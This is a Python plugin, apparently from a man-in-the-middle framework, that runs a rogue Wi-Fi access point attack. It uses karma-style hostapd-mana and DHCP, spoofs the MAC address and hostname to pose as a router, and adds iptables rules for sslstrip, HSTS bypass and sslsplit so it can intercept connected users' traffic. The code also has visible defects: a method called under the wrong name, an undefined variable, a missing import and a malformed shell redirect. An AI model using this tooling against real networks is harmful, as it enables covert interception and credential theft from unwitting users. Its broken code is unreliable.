# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from plugins.plugin import Plugin

import os
import time

DEFAULT_ESSID   = 'SEEMS LEGIT'
DEFAULT_BSSID   = '00:11:22:33:44:00'
DEFAULT_CHANNEL = 1

class ManaToolkit(Plugin):

    name      = 'ManaToolkit'
    optname   = 'mana'
    desc      = 'Use Mana Toolkit to perform rogue AP attack.'
    version   = "0.1"
    tree_info = ["Mana Toolkit running."]

    def initialize(self, options):

        from core.utils import iptables
        from core.hostapd_mana import HostAPDMana, DHCPDMana

        self.options = options

        self.interface = options.interface
        self.upstream = options.upstream
        self.essid = options.essid
        self.bssid = options.bssid
        self.channel = options.channel

        hostapd = HostAPDMana.get_instance()
        dhcpd = DHCPDMana.get_instance()

        hostapd.configure_karma(interface=self.interface,
                            essid=self.essid,
                            bssid=self.bssid,
                            channel=self.channel)

        dhcpd.select_conf('dhcpd.conf')

        self._kill_daemons()

        self._prepwifi(spoof_mac=options.nat_full, set_hostname=options.nat_full)
        
        if options.nat_simple:
            iptables().ROGUE_AP(hsts=True, sslstrip=True)
        elif options.nat_full:
            iptables().ROGUE_AP(hsts=True, sslstrip=True, sslsplit=True)

    def on_shutdown(self):

        from core.utils import iptables
        from core.hostapd_mana import HostAPDMana, DHCPDMana

        iptables().flush()
        HostAPDMana.get_instance().stop()
        DHCPDMana.get_instance().stop()

        set_ip_forwarding(0)

    def options(self, options):

        group = options.add_mutually_exclusive_group(required=False)

        group.add_argument('--nat-simple',
            dest='nat_simple',
            action='store_true',
            help='Use simple nat.')

        group.add_argument('--nat-full',
            dest='nat_full',
            action='store_true',
            help='Use full nat.')

        group.add_argument('--noupstream-all',
            dest='noupstream_all',
            action='store_true',
            help='Use no upstream all.')

        group.add_argument('--noupstream-eap',
            dest='noupstream_eap',
            action='store_true',
            help='Use no upstream eap.')

        group.add_argument('--noupstream-eaponly',
            dest='noupstream_eaponly',
            action='store_true',
            help='Use no upstream eaponly.')

        group.add_argument('--noupstream',
            dest='noupstream',
            action='store_true',
            help='Use no upstream.')

        options.add_argument('--upstream', 
            dest='upstream',
            type=str,
            required=False,
            help='Gateway iface.')

        options.add_argument('--channel', 
            dest='channel',
            type=int,
            default=DEFAULT_CHANNEL,
            required=False,
            help='AP channel.')

        options.add_argument('--bssid', 
            dest='bssid',
            default=DEFAULT_BSSID,
            type=str,
            required=False,
            help='AP bssid.')

        options.add_argument('--essid', 
            dest='essid',
            default=DEFAULT_ESSID,
            type=str,
            required=False,
            help='AP name.')

    def _killdaemons(self):
        os.system('killall dnsmasq 2>$1')

    def _prepwifi(self, spoof_mac=False, set_hostname=False):

        from core.utils import NetworkManager, set_ip_forwarding

        if set_hostname:
            os.system('hostname WRT540')
            time.sleep(2)

        network_manager = NetworkManager.get_instance()
        network_manager.stop()
        os.system('rfkill unblock wlan')

        if spoof_mac:
            from core.hostapd_mana import MacChanger
            macchanger = macchanger.get_instance()
            macchanger.random(self.interface)
        else:
            os.system('ifconfig %s up' % self.interface)

        time.sleep(5)
        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % self.interface)
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

        set_ip_forwarding(1)
